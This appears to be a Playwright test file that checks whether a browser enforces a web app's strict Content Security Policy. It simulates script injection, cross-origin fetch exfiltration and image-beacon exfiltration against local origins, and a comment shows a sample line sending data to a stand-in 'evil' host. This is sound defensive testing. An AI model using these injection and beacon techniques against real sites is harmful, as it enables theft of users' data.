import { test, expect, type Page } from '@playwright/test'

/**
 * Proves a REAL browser enforces the strict CSP shipped in `vercel.json` — the in-memory decrypted
 * model's only guard against an injected page script (at-rest crypto does nothing for cleartext in
 * the JS heap). `scripts/__tests__/csp-headers.test.ts` proves the JSON *string*; this proves the
 * browser *behaviour*. Served by `scripts/serve-dist-with-headers.ts` via the config's webServer:
 *   - baseURL (127.0.0.1:4180) = the ENFORCED origin (real CSP header).
 *   - CONTROL_ORIGIN (4181)    = the SAME dist/ with NO CSP header.
 *
 * The control test is the anti-false-pass keystone: the SAME injection that is BLOCKED on the
 * enforced origin must EXECUTE on the control origin — otherwise a silently-broken injector would
 * make the blocked assertion vacuous.
 */
const CONTROL_ORIGIN = 'http://127.0.0.1:4181'

interface CspViolation {
  readonly violatedDirective: string
  readonly blockedURI: string
}

declare global {
  interface Window {
    __inlineExecuted?: boolean
    __cspViolations?: CspViolation[]
  }
}

/**
 * Installed in the MAIN page world BEFORE navigation (addInitScript, not an in-evaluate promise), so
 * it observes the page's REAL CSP violations and survives the navigation with the flag pre-seeded
 * false — distinguishing "blocked" (stays false) from "never ran".
 */
async function installCollector(page: Page): Promise<void> {
  await page.addInitScript(() => {
    window.__inlineExecuted = false
    window.__cspViolations = []
    document.addEventListener('securitypolicyviolation', (e) => {
      window.__cspViolations?.push({ violatedDirective: e.violatedDirective, blockedURI: e.blockedURI })
    })
  })
}

/**
 * The SHARED injector — identical code path on enforced and control so a broken technique cannot
 * yield a false PASS. It runs in page.evaluate's isolated world, but the <script> element it appends
 * joins the MAIN document and is therefore evaluated against the page's CSP.
 */
async function injectInlineScript(page: Page): Promise<void> {
  await page.evaluate(() => {
    const s = document.createElement('script')
    s.textContent = 'window.__inlineExecuted = true'
    document.body.appendChild(s)
  })
}

const inlineExecuted = (page: Page) => page.evaluate(() => window.__inlineExecuted)
const violations = (page: Page) => page.evaluate(() => window.__cspViolations ?? [])

test.describe('CSP — real browser enforcement', () => {
  test("blocks a runtime-injected inline <script> (script-src 'self')", async ({ page }) => {
    await installCollector(page)
    await page.goto('/')
    await injectInlineScript(page)

    // PRIMARY proof: the inline script never executed.
    expect(await inlineExecuted(page)).toBe(false)

    // CORROBORATION: the browser reported a script-src violation (Chromium uses the granular
    // `script-src-elem` for an inline element, hence startsWith rather than ===).
    const v = await violations(page)
    expect(v.some((x) => x.violatedDirective.startsWith('script-src'))).toBe(true)

    // The enforced origin actually SENT the strict policy (guards a harness that dropped the CSP,
    // which would make the assertions above vacuous, and pins out any future `unsafe-inline` drift).
    const csp = (await page.request.get('/')).headers()['content-security-policy'] ?? ''
    expect(csp).toContain("script-src 'self'")
    expect(csp).not.toContain("'unsafe-inline'")
  })

  test('CONTROL: the same injection DOES execute when no CSP is served', async ({ page }) => {
    await installCollector(page)
    await page.goto(`${CONTROL_ORIGIN}/`)
    await injectInlineScript(page)

    // If this is false the injector is broken ⇒ the enforced test was a false pass.
    expect(await inlineExecuted(page)).toBe(true)
    expect(await violations(page)).toHaveLength(0)
  })

  test("blocks cross-origin network exfil (connect-src 'self')", async ({ page }) => {
    await installCollector(page)
    await page.goto('/')
    // The in-scope attack is exfil of the in-memory model via fetch/XHR/beacon. connect-src 'self'
    // must block a cross-origin request. The control origin (:4181) is a genuinely different origin,
    // so no internet is needed; the CSP check fires the violation BEFORE any network egress.
    await page.evaluate(async (target) => {
      try {
        await fetch(target, { mode: 'no-cors' })
      } catch {
        /* the CSP rejection is expected */
      }
    }, `${CONTROL_ORIGIN}/`)
    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('connect-src'))).toBe(true)
  })

  test('CONTROL: the same cross-origin fetch raises no connect-src violation with no CSP', async ({ page }) => {
    await installCollector(page)
    await page.goto(`${CONTROL_ORIGIN}/`)
    await page.evaluate(async (target) => {
      try {
        await fetch(target, { mode: 'no-cors' })
      } catch {
        /* a network/CORS failure, NOT a CSP violation */
      }
    }, 'http://127.0.0.1:4180/')
    // Proves the enforced violation above is caused by the CSP, not intrinsic to the cross-origin fetch.
    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('connect-src'))).toBe(false)
  })

  test("blocks a cross-origin image-beacon exfil (img-src 'self' data:)", async ({ page }) => {
    await installCollector(page)
    await page.goto('/')
    // A fetch-free exfil channel connect-src does NOT cover: `new Image().src = 'https://evil/?d=' + data`.
    // img-src governs sub-resource image loads, so a cross-origin image must fire an img-src violation.
    await page.evaluate(
      (target) =>
        new Promise<void>((resolve) => {
          const img = new Image()
          img.onload = () => resolve()
          img.onerror = () => resolve() // a CSP block manifests as a load error; the violation fires first
          img.src = `${target}/probe.png`
        }),
      CONTROL_ORIGIN,
    )
    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('img-src'))).toBe(true)
  })

  test('CONTROL: the same image-beacon raises no img-src violation with no CSP', async ({ page }) => {
    await installCollector(page)
    await page.goto(`${CONTROL_ORIGIN}/`)
    await page.evaluate(
      (target) =>
        new Promise<void>((resolve) => {
          const img = new Image()
          img.onload = () => resolve()
          img.onerror = () => resolve()
          img.src = `${target}/probe.png`
        }),
      'http://127.0.0.1:4180',
    )
    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('img-src'))).toBe(false)
  })

  test("engine module Web Worker constructs + round-trips under worker-src 'self' — through the REAL intake", async ({ page }) => {
    // RETARGETED at D1 (the U0 smoke readout is gone): drives the real product
    // path — cold start → the guided intake → a live provisional engine reading
    // — under the ENFORCED policy. Strictly stronger than the smoke arm: the
    // worker constructs at module eval, the React surface renders under
    // style-src 'self', and the 2000-path engine round-trips a transferred
    // buffer into the answer strip.
    await installCollector(page)
    await page.goto('/')

    await page.getByRole('button', { name: 'Begin' }).click()

    // Names + birth years + sex (a complete all-retired 65/63 household).
    // Person groups locate by the STABLE class — committing a name renames the
    // group's accessible legend mid-flow (by design), which would stale a
    // name-based locator.
    const you = page.locator('.person-group').first()
    const spouse = page.locator('.person-group').nth(1)
    // Segment radios are sr-only inside their labels — check({force}) sets
    // state deterministically regardless of any in-flight re-render (the strip
    // also reserves a fixed height so commits never shift layout mid-tap).
    const pick = (scope: ReturnType<typeof page.locator>, name: string) =>
      scope.getByRole('radio', { name, exact: true }).check({ force: true })
    await you.getByLabel('First name').fill('Pat')
    await you.getByLabel('Birth year').fill('1961')
    await pick(you, 'Male')
    await spouse.getByLabel('First name').fill('Sam')
    await spouse.getByLabel('Birth year').fill('1963')
    await pick(spouse, 'Female')
    const next = () => page.getByRole('button', { name: 'Continue' }).click()
    await next()

    // Work status: both already retired, stop ages entered.
    await pick(you, 'Already retired')
    await you.getByLabel('The age work stopped').fill('63')
    await pick(spouse, 'Already retired')
    await spouse.getByLabel('The age work stopped').fill('61')
    await next()

    // Social Security per person. Labels + value semantics follow the SS cold-read
    // rename (commit 3c04391c): the benefit field is now the MONTHLY at-FRA figure
    // (committed ×12 to the annual pia), and claiming is entered as the YEAR you
    // start (committed as year − birthYear → the whole-year claim age the engine
    // stores). Pat (b.1961) 2028 → age 67; Sam (b.1963) 2030 → age 67 — both inside
    // the 62–70 window; $2,000/$1,500 monthly is well under the magnitude ceiling.
    const ssAmounts = page.getByLabel('Monthly benefit at full retirement age')
    await ssAmounts.first().fill('2000')
    await ssAmounts.last().fill('1500')
    const claims = page.getByLabel('The year you’ll start Social Security')
    await claims.first().fill('2028')
    await claims.last().fill('2030')
    await next()

    // Spend (+ the explicit period confirm — the figure is ambiguous-band).
    await page.getByLabel('Household spending, all in').fill('7000')
    await page.getByRole('radio', { name: 'Each month' }).check({ force: true })
    await next()

    // The ACA quote pair (63 < 65 ⇒ required).
    await page.getByLabel('Your household’s combined monthly premium').fill('950')
    await page.getByLabel('Benchmark Silver plan, monthly (whole household)').fill('880')
    await next()

    // Out-of-pocket (optional) — skip; IRMAA seed (65 ⇒ required).
    await next()
    await page.getByLabel('Income, two years back').fill('120000')
    await page.getByLabel('Income, last year').fill('110000')
    await next()

    // One account (401k), committed to the loop. The single-ticker lookup was
    // retired in the account-form redesign — the blend is now one precise
    // stock/bond/cash split (sum-to-100, committed on blur). 100/0/0 = an
    // all-stock account (what the old "VTI" stood in for).
    await page.getByRole('button', { name: 'Add an account' }).click()
    await page.getByRole('radio', { name: '401(k)', exact: true }).check({ force: true })
    await page.getByLabel('Balance today').fill('1000000')
    await page.getByLabel('Stocks %').fill('100')
    await page.getByLabel('Bonds %').fill('0')
    await page.getByLabel('Cash %').fill('0')
    await page.getByRole('button', { name: 'Add this account' }).click()

    // Continue commits the account set → the engine dispatches: the strip's
    // reading appears only after the module worker constructed (worker-src
    // 'self') AND the real Monte Carlo engine round-tripped. 2000 paths +
    // tax/health overlays ⇒ generous timeout.
    await next()
    await expect(page.getByTestId('engine-reading')).toHaveText(/of 10/, { timeout: 60_000 })

    // No worker-src/script-src/style-src violation anywhere along the real path.
    const v = await violations(page)
    expect(v.some((x) => /worker-src|script-src|style-src/.test(x.violatedDirective))).toBe(false)
  })
})
